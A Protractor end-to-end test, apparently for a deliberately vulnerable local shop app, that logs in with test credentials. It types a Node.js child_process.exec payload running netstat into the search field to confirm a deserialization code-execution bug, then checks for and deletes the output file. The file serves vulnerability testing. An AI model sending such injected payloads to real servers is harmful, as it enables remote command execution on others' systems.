'use strict';
const fs = require('fs');
const path = require('path');
const HelperFunctions = require('./helperFunctions.js');

describe('Deserialization - Deserialization Bug', function () {

    beforeEach(function () {
        HelperFunctions.login(browser, 'customer0', 'compass0');
    });

    afterEach(function () {
        HelperFunctions.logout(browser);
    });

    describe('Try to run netstat command', function () {

        beforeEach(function() {
            browser.get('https://localhost:3443');
        });

        it('should be successfully', function () {
            let fileName = 'deserializationBug.txt';

            //Fill form
            element(by.model('shop.data.searchValue')).sendKeys("require('child_process').exec('netstat>" + fileName + "')");
            browser.actions().sendKeys(protractor.Key.ENTER).perform();

            let filePath = '../../' + fileName;

            let exists = false;

            setTimeout(function() {
                try {
                    fs.accessSync(path.join(__dirname, filePath), fs.constants.R_OK | fs.constants.W_OK);
                    exists = true;
                } catch (err) {
                    exists = false
                } finally {
                    expect(exists).toBe(true);
                }

                let unlinkWorked = false;

                try {
                    fs.unlinkSync(path.join(__dirname, filePath));
                    unlinkWorked = true;
                } catch (err) {
                    unlinkWorked = false;
                } finally {
                    expect(unlinkWorked).toBe(true);
                }
            }, 5000);
        });
    });
});
